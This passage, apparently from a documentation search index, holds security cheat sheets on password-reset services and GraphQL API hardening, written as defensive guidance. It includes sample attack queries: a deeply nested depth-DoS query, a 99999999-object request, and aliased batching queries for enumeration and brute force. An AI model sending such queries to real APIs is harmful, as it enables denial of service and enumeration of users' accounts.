PINs by creating a restricted session from the token. Decision should be made based on the needs and the expertise of the developer. PINs \u00b6 PINs are numbers (between 6 and 12 digits) that are sent to the user through a side-channel such as SMS. Generate a PIN. Send it to the user via SMS or another mechanism. Breaking the PIN up with spaces makes it easier for the user to read and enter. The user then enters the PIN along with their username on the password reset page. Create a limited session from that PIN that only permits the user to reset their password. Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied. Offline Methods \u00b6 Offline methods differ from other methods by allowing the user to reset their password without requesting a special identifier (such as a token or PIN) from the backend. However, authentication still needs to be conducted by the backend to ensure that the request is legitimate. Offline methods provide a certain identifier either on registration, or when the user wishes to configure it. These identifiers should be stored offline and in a secure fashion ( e.g. password managers), and the backend should properly follow the general security practices . Some implementations are built on hardware OTP tokens , certificates , or any other implementation that could be used inside of an enterprise. These are out of scope for this cheat sheet. Backup Codes \u00b6 Backup codes should be provided to the user upon registering where the user should store them offline in a secure place (such as their password manager). Some companies that implement this method are Google , GitHub , and Auth0 . While implementing this method, the following practices should be followed: Minimum length of 8 digits, 12 for improved security. A user should have multiple recovery codes at any given time to ensure that one of them works (most services provide the user with ten backup codes). A process should be implemented to allow the user to invalidate all existing recovery codes, in case they are compromised by a third party. Rate limiting and other protections should be implemented to prevent an attacker from brute-forcing the backup codes. Security Questions \u00b6 Security questions should not be used as the sole mechanism for resetting passwords due to their answers frequently being easily guessable or obtainable by attackers. However, they can provide an additional layer of security when combined with the other methods discussed in this cheat sheet. If they are used, then ensure that secure questions are chosen as discussed in the Security Questions cheat sheet .","title":"Forgot Password"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#forgot-password-cheat-sheet","text":"","title":"Forgot Password Cheat Sheet"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#introduction","text":"In order to implement a proper user management system, systems integrate a Forgot Password service that allows the user to request a password reset. Even though this functionality looks straightforward and easy to implement, it is a common source of vulnerabilities, such as the renowned user enumeration attack . The following short guidelines can be used as a quick reference to protect the forgot password service: Return a consistent message for both existent and non-existent accounts. Ensure that the time taken for the user response message is uniform. Use a side-channel to communicate the method to reset their password. Use URL tokens for the simplest and fastest implementation. Ensure that generated tokens or codes are: Randomly genererated using a cryptographically safe algorithm. Sufficiently long to protect against brute-force attacks. Stored securely. Single use and expire after an appropriate period. This cheat sheet is focused on resetting users passwords. For guidance on resetting multifactor authentication (MFA), see the relevant section in the Multifactor Authentication Cheat Sheet .","title":"Introduction"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#forgot-password-service","text":"The password reset process can be broken into two main steps, detailed in the following sections.","title":"Forgot Password Service"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#forgot-password-request","text":"When a user uses the forgot password service and inputs their username or email, the below should be followed to implement a secure process: Return a consistent message for both existent and non-existent accounts. Ensure that responses return in a consistent amount of time to prevent an attacker enumerating which accounts exist. This could be achieved by using asynchronous calls or by making sure that the same logic is followed, instead of using a quick exit method. Implement protections against automated submissions such as CAPTCHA, rate-limiting or other controls. Employ normal security measures, such as SQL Injection Prevention methods and Input Validation .","title":"Forgot Password Request"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#user-resets-password","text":"Once the user has proved their identity by providing the token (sent via an email) or code (sent via SMS or other mechanisms), they should reset their password to a new secure one. In order to secure this step, the measures that should be taken are: The user should confirm the password they set by writing it twice. Ensure that a secure password policy is in place, and is consistent with the rest of the application. Update and store the password following secure practices . Send the user an email informing them that their password has been reset (do not send the password in the email!). Once they have set their new password, the user should then login through the usual mechanism. Don't automatically log the user in, as this introduces additional complexity to the authentication and session handling code, and increases the likelihood of introducing vulnerabilities. Ask the user if they want to invalidate all of their existing sessions, or invalidate the sessions automatically.","title":"User Resets Password"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#methods","text":"In order to allow a user to request a password reset, you will need to have some way to identify the user, or a means to reach out to them through a side-channel. This can be done through any of the following methods: URL tokens . PINs Offline methods Security questions . These methods can be used together to provide a greater degree of assurance that the user is who they claim to be. No matter what, you must ensure that a user always has a way to recover their account, even if that involves contacting the support team and proving their identity to staff.","title":"Methods"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#general-security-practices","text":"It is essential to employ good security practices for the reset identifiers (tokens, codes, PINs, etc.). Some points don't apply to the offline methods , such as the lifetime restriction. All tokens and codes should be: Generated cryptographically secure random number generator . It is also possible to use JSON Web Tokens (JWTs) in place of random tokens, although this can introduce additional vulnerability, such as those discussed in the JSON Web Token Cheat Sheet . Long enough to protect against brute-force attacks. Linked to an individual user in the database. Invalidated after they have been used. Stored in a secure manner, as discussed in the Password Storage Cheat Sheet .","title":"General Security Practices"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#url-tokens","text":"URL tokens are passed in the query string of the URL, and are typically sent to the user via email. The basic overview of the process is as follows: Generate a token to the user and attach it in the URL query string. Send this token to the user via email. Don't rely on the Host header while creating the reset URLs to avoid Host Header Injection attacks. The URL should be either be hard-coded, or should be validated against a whitelist of trusted domains. Ensure that the URL is using HTTPS. The user receives the email, and browses to the URL with the attached token. Ensure that the reset password page adds the Referrer Policy tag with the noreferrer value in order to avoid referrer leakage . Implement appropriate protection to prevent users from brute-forcing tokens in the URL, such as rate limiting. If required, perform any additional validation steps such as requiring the user to answer security questions . Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied. Note: URL tokens can follow on the same behavior of the PINs by creating a restricted session from the token. Decision should be made based on the needs and the expertise of the developer.","title":"URL Tokens"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#pins","text":"PINs are numbers (between 6 and 12 digits) that are sent to the user through a side-channel such as SMS. Generate a PIN. Send it to the user via SMS or another mechanism. Breaking the PIN up with spaces makes it easier for the user to read and enter. The user then enters the PIN along with their username on the password reset page. Create a limited session from that PIN that only permits the user to reset their password. Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied.","title":"PINs"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#offline-methods","text":"Offline methods differ from other methods by allowing the user to reset their password without requesting a special identifier (such as a token or PIN) from the backend. However, authentication still needs to be conducted by the backend to ensure that the request is legitimate. Offline methods provide a certain identifier either on registration, or when the user wishes to configure it. These identifiers should be stored offline and in a secure fashion ( e.g. password managers), and the backend should properly follow the general security practices . Some implementations are built on hardware OTP tokens , certificates , or any other implementation that could be used inside of an enterprise. These are out of scope for this cheat sheet.","title":"Offline Methods"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#backup-codes","text":"Backup codes should be provided to the user upon registering where the user should store them offline in a secure place (such as their password manager). Some companies that implement this method are Google , GitHub , and Auth0 . While implementing this method, the following practices should be followed: Minimum length of 8 digits, 12 for improved security. A user should have multiple recovery codes at any given time to ensure that one of them works (most services provide the user with ten backup codes). A process should be implemented to allow the user to invalidate all existing recovery codes, in case they are compromised by a third party. Rate limiting and other protections should be implemented to prevent an attacker from brute-forcing the backup codes.","title":"Backup Codes"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html#security-questions","text":"Security questions should not be used as the sole mechanism for resetting passwords due to their answers frequently being easily guessable or obtainable by attackers. However, they can provide an additional layer of security when combined with the other methods discussed in this cheat sheet. If they are used, then ensure that secure questions are chosen as discussed in the Security Questions cheat sheet .","title":"Security Questions"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html","text":"GraphQL Cheat Sheet \u00b6 Introduction \u00b6 GraphQL is an open source query language originally developed by Facebook that can be used to build APIs as an alternative to REST and SOAP. It has gained popularity since its inception in 2012 because of the native flexibility it offers to those building and calling the API. There are GraphQL servers and clients implemented in various languages. Many companies use GraphQL including GitHub, Credit Karma, Intuit, and PayPal. This Cheat Sheet provides guidance on the various areas that need to be considered when working with GraphQL: Apply proper input validation checks on all incoming data. Expensive queries will lead to Denial of Service (DoS) , so add checks to limit or prevent queries that are too expensive. Ensure that the API has proper access control checks. Disable insecure default configurations ( e.g. introspection, GraphiQL, excessive errors, etc.). Common Attacks \u00b6 Injection - this usually includes but is not limited to: SQL and NoSQL injection OS Command injection SSRF and CRLF injection / Request Smuggling DoS ( Denial of Service ) Abuse of broken authorization: either improper or excessive access, including IDOR Batching Attacks, a GraphQL-specific method of brute force attack Abuse of insecure default configurations Best Practices and Recommendations \u00b6 Input Validation \u00b6 Adding strict input validation can help prevent against injection and DoS. The main design for GraphQL is that the user supplies one or more identifiers and the backend has a number of data fetchers making HTTP, DB, or other calls using the given identifiers. This means that user input will be included in HTTP requests, DB queries, or other requests/calls which provides opportunity for injection that could lead to various injection attacks or DoS. See the OWASP Cheat Sheets on Input Validation and general injection prevention for full details to best perform input validation and prevent injection. General Practices \u00b6 Validate all incoming data to only allow valid values (i.e. whitelist). Use specific GraphQL data types such as scalars or enums . Write custom GraphQL validators for more complex validations. Custom scalars may also come in handy. Define schemas for mutations input . Whitelist allowed characters - don't use a blacklist The stricter the whitelist the better. A lot of times a good starting point is only allowing alphanumeric, non-unicode characters because it will disallow many attacks. To properly handle unicode input, use a single internal character encoding Gracefully reject invalid input , being careful not to reveal excessive information about how the API and its validation works. Injection Prevention \u00b6 When handling input meant to be passed to another interpreter ( e.g. SQL/NoSQL/ORM, OS, LDAP, XML): Always choose libraries/modules/packages offering safe APIs, such as parameterized statements. Ensure that you follow the documentation so you are properly using the tool Using ORMs and ODMs are a good option but they must be used properly to avoid flaws such as ORM injection . If such tools are not available, always escape/encode input data according to best practices of the target interpreter Choose a well-documented and actively maintained escaping/encoding library. Many languages and frameworks have this functionality built-in. For more information see the below pages: SQL Injection Prevention NoSQL Injection Prevention LDAP Injection Prevention OS Command Injection Prevention XML Security and XXE Injection Prevention Process Validation \u00b6 When using user input, even if sanitized and/or validated, it should not be used for certain purposes that would give a user control over data flow. For example, do not make an HTTP/resource request to a host that the user supplies (unless there is an absolute business need). DoS Prevention \u00b6 DoS is an attack against the availability and stability of the API that can make it slow, unresponsive, or completely unavailable. This CS details several methods to limit the possibility of a DoS attack at the application level and other layers of the tech stack. There is also a CS dedicated to the topic of DoS . Here are recommendations specific to GraphQL to limit the potential for DoS: Add depth limiting to incoming queries Add amount limiting to incoming queries Add pagination to limit the amount of data that can be returned in a single response Add reasonable timeouts at the application layer, infrastructure layer, or both Consider performing query cost analysis and enforcing a maximum allowed cost per query Enforce rate limiting on incoming requests per IP or user (or both) to prevent basic DoS attacks Implement the batching and caching technique on the server-side (Facebook's DataLoader can be used for this) Query Limiting (Depth & Amount) \u00b6 In GraphQL each query has a depth ( e.g. nested objects) and each object requested in a query can have an amount specified ( e.g. 99999999 of an object). By default these can both be unlimited which may lead to a DoS. You should set limits on depth and amount to prevent DoS, but this usually requires a small custom implementation as it is not natively supported by GraphQL. See this and this page for more information about these attacks and how to add depth and amount limiting. Adding pagination can also help performance. APIs using graphql-java can utilize the built-in MaxQueryDepthInstrumentation for depth limiting. APIs using JavaScript can use graphql-depth-limit to implement depth limiting and graphql-input-number to implement amount limiting. Here is an example of a GraphQL query with depth N: query evil { # Depth : 0 album ( id : 42 ) { # Depth : 1 songs { # Depth : 2 album { # Depth : 3 ... # Depth : ... album { id : N } # Depth : N } } } } Here is an example of a GraphQL query requesting 99999999 of an object: query { author ( id : \"abc\" ) { posts ( first : 99999999 ) { title } } } Timeouts \u00b6 Adding timeouts can be a simple way to limit how many resources any single request can consume. But timeouts are not always effective since they may not activate until a malicious query has already consumed excessive resources. Timeout requirements will differ by API and data fetching mechanism; there isn't one timeout value that will work across the board. At the application level, timeouts can be added for queries and resolver functions. This option is usually more effective since the query/resolution can be stopped once the timeout is reached. GraphQL does not natively support query timeouts so custom code is required. See this blog post for more about using timeouts with GraphQL or the two examples below. JavaScript Timeout Example Code snippet from this SO answer : request . incrementResolverCount = function () { var runTime = Date . now () - startTime ; if ( runTime > 10000 ) { // a timeout of 10 seconds if ( request . logTimeoutError ) { logger ( 'ERROR' , `Request ${ request . uuid } query execution timeout` ); } request . logTimeoutError = false ; throw 'Query execution has timeout. Field resolution aborted' ; } this . resolverCount ++ ; }; Java Timeout Example using Instrumentation public class TimeoutInstrumentation extends SimpleInstrumentation { @Override public DataFetcher <?> instrumentDataFetcher ( DataFetcher <?> dataFetcher , InstrumentationFieldFetchParameters parameters ) { return environment -> Observable . fromCallable (() -> dataFetcher . get ( environment )) . subscribeOn ( Schedulers . computation ()) . timeout ( 10 , TimeUnit . SECONDS ) // timeout of 10 seconds . blockingFirst (); } } Infrastructure Timeout Another option to add a timeout that is usually easier is adding a timeout on an HTTP server ( Apache/httpd , nginx ), reverse proxy, or load balancer. However, infrastructure timeouts are often inaccurate and can be bypassed more easily than application-level ones. Query Cost Analysis \u00b6 Query cost analysis involves assigning costs to the resolution of fields or types in incoming queries so that the server can reject queries that cost too much to run or will consume too many resources. This is not easy to implement and may not always be necessary but it is the most thorough approach to preventing DoS. See \"Query Cost Analysis\" in this blog post for more details on implementing this control. Apollo recommends: Before you go ahead and spend a ton of time implementing query cost analysis be certain you need it. Try to crash or slow down your staging API with a nasty query and see how far you get \u2014 maybe your API doesn\u2019t have these kinds of nested relationships, or maybe it can handle fetching thousands of records at a time perfectly fine and doesn\u2019t need query cost analysis! APIs using graphql-java can utilize the built-in MaxQueryComplexityInstrumentationto to enforce max query complexity. APIs using JavaScript can utilize graphql-cost-analysis or graphql-validation-complexity to enforce max query cost. Rate Limiting \u00b6 Enforcing rate limiting on a per IP (for anonymous access) or user (for authenticated access) basis can help limit a single user's ability to spam requests to the service and impact performance. Ideally this can be done with a WAF, API gateway, or web server ( Nginx , Apache / HTTPD ) to reduce the effort of adding rate limiting. Or you could get somewhat complex with throttling and implement it in your code (non-trivial). See \"Throttling\" here for more about GraphQL-specific rate limiting. Server-side Batching and Caching \u00b6 To increase efficiency of a GraphQL API and reduce its resource consumption, the batching and caching technique can be used to prevent making duplicate requests for pieces of data within a small time frame. Facebook's DataLoader tool is one way to implement this. System Resource Management \u00b6 Not properly limiting the amount of resources your API can use ( e.g. CPU or memory), may compromise your API responsiveness and availability, leaving it vulnerable to DoS attacks. Some limiting can be done at the operating system level. On Linux, a combination of Control Groups(cgroups) , User Limits (ulimits) , and Linux Containers (LXC) can be used. However, containerization platforms tend to make this task much easier. See the resource limiting section in the Docker Security Cheat Sheet for how to prevent DoS when using containers. Access Control \u00b6 To ensure that a GraphQL API has proper access control, do the following: Always validate that the requester is authorized to view or mutate/modify the data they are requesting. This can be done with RBAC or other access control mechanisms. This will prevent IDOR issues, including both BOLA and BFLA . Enforce authorization checks on both edges and nodes (see example bug report where nodes did not have authorization checks but edges did). Use Interfaces and Unions to create structured, hierarchical data types which can be used to return more or fewer object properties, according to requester permissions. Query and Mutation Resolvers can be used to perform access control validation, possibly using some RBAC middleware. Disable introspection queries system-wide in any production or publicly accessible environments. Disable GraphiQL and other similar schema exploration tools in production or publicly accessible environments. General Data Access \u00b6 It's commonplace for GraphQL requests to include one or more direct IDs of objects in order to fetch or modify them. For example, a request for a certain picture may include the ID that is actually the primary key in the database for that picture. As with any request, the server must verify that the caller has access to the object they are requesting. But sometimes developers make the mistake of assuming that possession of the object's ID means the caller should have access. Failure to verify the requester's access in this case is called Broken Object Level Authentication , also known as IDOR . It's possible for a GraphQL API to support access to objects using their ID even if that is not intended. Sometimes there are node or nodes or both fields in a query object, and these can be used to access objects directly by ID . You can check whether your schema has these fields by running this on the command-line (assuming that schema.json contains your GraphQL schema): cat schema.json | jq \".data.__schema.types[] | select(.name==\\\"Query\\\") | .fields[] | .name\" | grep node . Removing these fields from the schema should disable the functionality, but you should always apply proper authorization checks to verify the caller has access to the object they are requesting. Query Access (Data Fetching) \u00b6 As part of a GraphQL API there will be various data fields that can be returned. One thing to consider is if you want different levels of access around these fields. For example, you may only want certain consumers to be able to fetch certain data fields rather than allowing all consumers to be able to retrieve all available fields. This can be done by adding a check in the code to ensure that the requester should be able to read a field they are trying to fetch. Mutation Access (Data Manipulation) \u00b6 GraphQL supports mutation, or manipulation of data, in addition to its most common use case of data fetching. If an API implements/allows mutation then there may need to be access controls put in place to restrict which consumers, if any, can modify data through the API. Setups that require mutation access control would include APIs where only read access is intended for requesters or where only certain parties should be able to modify certain fields. Batching Attacks \u00b6 GraphQL supports batching requests, also known as query batching . This lets callers to either batch multiple queries or batch requests for multiple object instances in a single network call, which allows for what is called a batching attack . This is a form of brute force attack, specific to GraphQL, that usually allows for faster and less detectable exploits. Here is the most common way to do query batching: [ { query : < query 0 > , variables : < variables for query 0 > , }, { query : < query 1 > , variables : < variables for query 1 > , }, { query : < query n > variables : < variables for query n > , } ] And here is an example query of a single batched GraphQL call requesting multiple different instances of the droid object: query { droid ( id : \"2000\" ) { name } second : droid ( id : \"2001\" ) { name } third : droid ( id : \"2002\" ) { name } } In this case it could be used to enumerate every possible droid object that is stored on the server in very few network requests as opposed to a standard REST API where the requester would need to submit a different network request for every different droid ID they want to request. This type of attack can lead to the following issues: Application-level DoS attacks - A high number of queries or object requests in a single network call could cause a database to hang or exhaust other available resources ( e.g. memory, CPU, downstream services). Enumeration of objects on the server, such as users, emails, and user IDs. Brute forcing passwords, 2 factor authentication codes (OTPs), session tokens, or other sensitive values. WAFs, RASPs, IDS/IPS, SIEMs, or other security tooling will likely not detect these attacks since they only appear to be one single request rather than an a massive amount of network traffic. This attack will likely bypass existing rate limits in tools like Nginx or other proxies/gateways since they rely on looking at the raw number of requests. Mitigating Batching Attacks \u00b6 In order to mitigate this type of attack you should put limits on incoming requests at the code level so that they can be applied per request. There are 3 main options: Add object request rate limiting in code Prevent batching for sensitive objects Limit the number of queries that can run at one time One option is to create a code-level rate limit on how many objects that callers can request. This means the backend would track how many different object instances the caller has requested, so that they will be blocked after requesting too many objects even if they batch the object requests in a single network call. This replicates a network-level rate limit that a WAF or other tool would do. Another option is to prevent batching for sensitive objects that you don't want to be brute forced, such as usernames, emails, passwords, OTPs, session tokens, etc. This way an attacker is forced to attack the API like a REST API and make a different network call per object instance. This is not supported natively so it will require a custom solution. However once this control is put in place other standard controls will function normally to help prevent any brute forcing. Limiting the number of operations that can be batched and run at once is another option to mitigate GraphQL batching attacks leading to DoS. This is not a silver bullet though and should be used in conjunction with other methods. Secure Configurations \u00b6 By default, most GraphQL implementations have some insecure default configurations which should be changed: Disable or restrict Introspection and GraphiQL based on your needs; these should only be used for development purposes. Don't return excessive error messages ( e.g. disable stack traces and debug mode). Introspection + GraphiQL \u00b6 Many implementations of GraphQL have Introspection and GraphiQL enabled by default and leave them accessible without requiring authentication. This is problematic because introspection allows the requester to learn all about supported schema and queries (see a real-world example abusing this). Introspection might be how the API owner wants to educate consumers about how to use the API. However, the preferred way to educate consumers about a service is through a separate documentation channel such as a wiki, Git Readme, or readthedocs. The safest and usually easiest approach is to just disable introspection and GraphiQL system-wide. See this page or consult your GraphQL implementation's documentation to learn how to disable introspection altogether. If your implementation does not natively support disabling introspection or if you would like to allow some consumers/roles to have this access you can build a filter in your service to only allow approved consumers to access the introspection system. Keep in mind that even if introspection is disabled, attackers can still guess fields by brute forcing them. Furthermore, GraphQL has a built-in feature to return a hint when a field name that the requester provides is similar (but incorrect) to an existing field ( e.g. request has usr and the response will ask Did you mean \"user?\" ). You should consider disabling this feature to decrease the exposure, but not all implementations of GraphQL support doing so. Shapeshifter is one tool that should be able to do this . Disable Introspection - Java GraphQLSchema schema = GraphQLSchema . newSchema () . query ( StarWarsSchema . queryType ) . fieldVisibility ( NoIntrospectionGraphqlFieldVisibility . NO_INTROSPECTION_FIELD_VISIBILITY ) . build (); Disable Introspection & GraphiQL - JavaScript app . use ( '/graphql' , graphqlHTTP ({ schema : MySessionAwareGraphQLSchema , + validationRules : [ NoIntrospection ] graphiql : process . env . NODE_ENV === 'development' , })); Don't Return Excessive Errors \u00b6 GraphQL APIs in production shouldn't return stack traces or be in debug mode. Doing this is implementation specific, but using middleware is one popular way to have better control over errors the server returns. To disable excessive errors with Apollo Server, either pass debug: false to the Apollo Server constructor or set the NODE_ENV environment variable to 'production' or 'test'. However, if you would like to log the stack trace internally without returning it to the user see here for how to mask and log errors so they are available to the developers but not callers of the API. Other Resources \u00b6 Tools \u00b6 InQL Scanner - Security scanner for GraphQL. Particularly useful for generating queries and mutations automatically from given schema and them feeding them to scanner. GraphiQL - Schema/object exploration GraphQL Voyager - Schema/object exploration GraphQL Security Best Practices + Documentation \u00b6 GraphQL security best practices Protecting GraphQL APIs from security threats - blog post https://nordicapis.com/security-points-to-consider-before-implementing-graphql/ Limiting resource usage to prevent DoS (timeouts, throttling, complexity management, depth limiting, etc.) GraphQL Security Perspectives A developer's security perspective of GraphQL More on GraphQL Attacks \u00b6 Some common GraphQL attacks + attacker mindset Bypassing permissions by smuggling parameters Bug bounty writeup about GraphQL Security talk about Abusing GraphQL Real world attacks against GraphQL in the past Attack examples against GraphQL","title":"GraphQL"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#graphql-cheat-sheet","text":"","title":"GraphQL Cheat Sheet"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#introduction","text":"GraphQL is an open source query language originally developed by Facebook that can be used to build APIs as an alternative to REST and SOAP. It has gained popularity since its inception in 2012 because of the native flexibility it offers to those building and calling the API. There are GraphQL servers and clients implemented in various languages. Many companies use GraphQL including GitHub, Credit Karma, Intuit, and PayPal. This Cheat Sheet provides guidance on the various areas that need to be considered when working with GraphQL: Apply proper input validation checks on all incoming data. Expensive queries will lead to Denial of Service (DoS) , so add checks to limit or prevent queries that are too expensive. Ensure that the API has proper access control checks. Disable insecure default configurations ( e.g. introspection, GraphiQL, excessive errors, etc.).","title":"Introduction"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#common-attacks","text":"Injection - this usually includes but is not limited to: SQL and NoSQL injection OS Command injection SSRF and CRLF injection / Request Smuggling DoS ( Denial of Service ) Abuse of broken authorization: either improper or excessive access, including IDOR Batching Attacks, a GraphQL-specific method of brute force attack Abuse of insecure default configurations","title":"Common Attacks"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#best-practices-and-recommendations","text":"","title":"Best Practices and Recommendations"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#input-validation","text":"Adding strict input validation can help prevent against injection and DoS. The main design for GraphQL is that the user supplies one or more identifiers and the backend has a number of data fetchers making HTTP, DB, or other calls using the given identifiers. This means that user input will be included in HTTP requests, DB queries, or other requests/calls which provides opportunity for injection that could lead to various injection attacks or DoS. See the OWASP Cheat Sheets on Input Validation and general injection prevention for full details to best perform input validation and prevent injection.","title":"Input Validation"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#general-practices","text":"Validate all incoming data to only allow valid values (i.e. whitelist). Use specific GraphQL data types such as scalars or enums . Write custom GraphQL validators for more complex validations. Custom scalars may also come in handy. Define schemas for mutations input . Whitelist allowed characters - don't use a blacklist The stricter the whitelist the better. A lot of times a good starting point is only allowing alphanumeric, non-unicode characters because it will disallow many attacks. To properly handle unicode input, use a single internal character encoding Gracefully reject invalid input , being careful not to reveal excessive information about how the API and its validation works.","title":"General Practices"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#injection-prevention","text":"When handling input meant to be passed to another interpreter ( e.g. SQL/NoSQL/ORM, OS, LDAP, XML): Always choose libraries/modules/packages offering safe APIs, such as parameterized statements. Ensure that you follow the documentation so you are properly using the tool Using ORMs and ODMs are a good option but they must be used properly to avoid flaws such as ORM injection . If such tools are not available, always escape/encode input data according to best practices of the target interpreter Choose a well-documented and actively maintained escaping/encoding library. Many languages and frameworks have this functionality built-in. For more information see the below pages: SQL Injection Prevention NoSQL Injection Prevention LDAP Injection Prevention OS Command Injection Prevention XML Security and XXE Injection Prevention","title":"Injection Prevention"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#process-validation","text":"When using user input, even if sanitized and/or validated, it should not be used for certain purposes that would give a user control over data flow. For example, do not make an HTTP/resource request to a host that the user supplies (unless there is an absolute business need).","title":"Process Validation"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention","text":"DoS is an attack against the availability and stability of the API that can make it slow, unresponsive, or completely unavailable. This CS details several methods to limit the possibility of a DoS attack at the application level and other layers of the tech stack. There is also a CS dedicated to the topic of DoS . Here are recommendations specific to GraphQL to limit the potential for DoS: Add depth limiting to incoming queries Add amount limiting to incoming queries Add pagination to limit the amount of data that can be returned in a single response Add reasonable timeouts at the application layer, infrastructure layer, or both Consider performing query cost analysis and enforcing a maximum allowed cost per query Enforce rate limiting on incoming requests per IP or user (or both) to prevent basic DoS attacks Implement the batching and caching technique on the server-side (Facebook's DataLoader can be used for this)","title":"DoS Prevention"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#query-limiting-depth-amount","text":"In GraphQL each query has a depth ( e.g. nested objects) and each object requested in a query can have an amount specified ( e.g. 99999999 of an object). By default these can both be unlimited which may lead to a DoS. You should set limits on depth and amount to prevent DoS, but this usually requires a small custom implementation as it is not natively supported by GraphQL. See this and this page for more information about these attacks and how to add depth and amount limiting. Adding pagination can also help performance. APIs using graphql-java can utilize the built-in MaxQueryDepthInstrumentation for depth limiting. APIs using JavaScript can use graphql-depth-limit to implement depth limiting and graphql-input-number to implement amount limiting. Here is an example of a GraphQL query with depth N: query evil { # Depth : 0 album ( id : 42 ) { # Depth : 1 songs { # Depth : 2 album { # Depth : 3 ... # Depth : ... album { id : N } # Depth : N } } } } Here is an example of a GraphQL query requesting 99999999 of an object: query { author ( id : \"abc\" ) { posts ( first : 99999999 ) { title } } }","title":"Query Limiting (Depth &amp; Amount)"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#timeouts","text":"Adding timeouts can be a simple way to limit how many resources any single request can consume. But timeouts are not always effective since they may not activate until a malicious query has already consumed excessive resources. Timeout requirements will differ by API and data fetching mechanism; there isn't one timeout value that will work across the board. At the application level, timeouts can be added for queries and resolver functions. This option is usually more effective since the query/resolution can be stopped once the timeout is reached. GraphQL does not natively support query timeouts so custom code is required. See this blog post for more about using timeouts with GraphQL or the two examples below. JavaScript Timeout Example Code snippet from this SO answer : request . incrementResolverCount = function () { var runTime = Date . now () - startTime ; if ( runTime > 10000 ) { // a timeout of 10 seconds if ( request . logTimeoutError ) { logger ( 'ERROR' , `Request ${ request . uuid } query execution timeout` ); } request . logTimeoutError = false ; throw 'Query execution has timeout. Field resolution aborted' ; } this . resolverCount ++ ; }; Java Timeout Example using Instrumentation public class TimeoutInstrumentation extends SimpleInstrumentation { @Override public DataFetcher <?> instrumentDataFetcher ( DataFetcher <?> dataFetcher , InstrumentationFieldFetchParameters parameters ) { return environment -> Observable . fromCallable (() -> dataFetcher . get ( environment )) . subscribeOn ( Schedulers . computation ()) . timeout ( 10 , TimeUnit . SECONDS ) // timeout of 10 seconds . blockingFirst (); } } Infrastructure Timeout Another option to add a timeout that is usually easier is adding a timeout on an HTTP server ( Apache/httpd , nginx ), reverse proxy, or load balancer. However, infrastructure timeouts are often inaccurate and can be bypassed more easily than application-level ones.","title":"Timeouts"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#query-cost-analysis","text":"Query cost analysis involves assigning costs to the resolution of fields or types in incoming queries so that the server can reject queries that cost too much to run or will consume too many resources. This is not easy to implement and may not always be necessary but it is the most thorough approach to preventing DoS. See \"Query Cost Analysis\" in this blog post for more details on implementing this control. Apollo recommends: Before you go ahead and spend a ton of time implementing query cost analysis be certain you need it. Try to crash or slow down your staging API with a nasty query and see how far you get \u2014 maybe your API doesn\u2019t have these kinds of nested relationships, or maybe it can handle fetching thousands of records at a time perfectly fine and doesn\u2019t need query cost analysis! APIs using graphql-java can utilize the built-in MaxQueryComplexityInstrumentationto to enforce max query complexity. APIs using JavaScript can utilize graphql-cost-analysis or graphql-validation-complexity to enforce max query cost.","title":"Query Cost Analysis"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#rate-limiting","text":"Enforcing rate limiting on a per IP (for anonymous access) or user (for authenticated access) basis can help limit a single user's ability to spam requests to the service and impact performance. Ideally this can be done with a WAF, API gateway, or web server ( Nginx , Apache / HTTPD ) to reduce the effort of adding rate limiting. Or you could get somewhat complex with throttling and implement it in your code (non-trivial). See \"Throttling\" here for more about GraphQL-specific rate limiting.","title":"Rate Limiting"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#server-side-batching-and-caching","text":"To increase efficiency of a GraphQL API and reduce its resource consumption, the batching and caching technique can be used to prevent making duplicate requests for pieces of data within a small time frame. Facebook's DataLoader tool is one way to implement this.","title":"Server-side Batching and Caching"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#system-resource-management","text":"Not properly limiting the amount of resources your API can use ( e.g. CPU or memory), may compromise your API responsiveness and availability, leaving it vulnerable to DoS attacks. Some limiting can be done at the operating system level. On Linux, a combination of Control Groups(cgroups) , User Limits (ulimits) , and Linux Containers (LXC) can be used. However, containerization platforms tend to make this task much easier. See the resource limiting section in the Docker Security Cheat Sheet for how to prevent DoS when using containers.","title":"System Resource Management"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#access-control","text":"To ensure that a GraphQL API has proper access control, do the following: Always validate that the requester is authorized to view or mutate/modify the data they are requesting. This can be done with RBAC or other access control mechanisms. This will prevent IDOR issues, including both BOLA and BFLA . Enforce authorization checks on both edges and nodes (see example bug report where nodes did not have authorization checks but edges did). Use Interfaces and Unions to create structured, hierarchical data types which can be used to return more or fewer object properties, according to requester permissions. Query and Mutation Resolvers can be used to perform access control validation, possibly using some RBAC middleware. Disable introspection queries system-wide in any production or publicly accessible environments. Disable GraphiQL and other similar schema exploration tools in production or publicly accessible environments.","title":"Access Control"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#general-data-access","text":"It's commonplace for GraphQL requests to include one or more direct IDs of objects in order to fetch or modify them. For example, a request 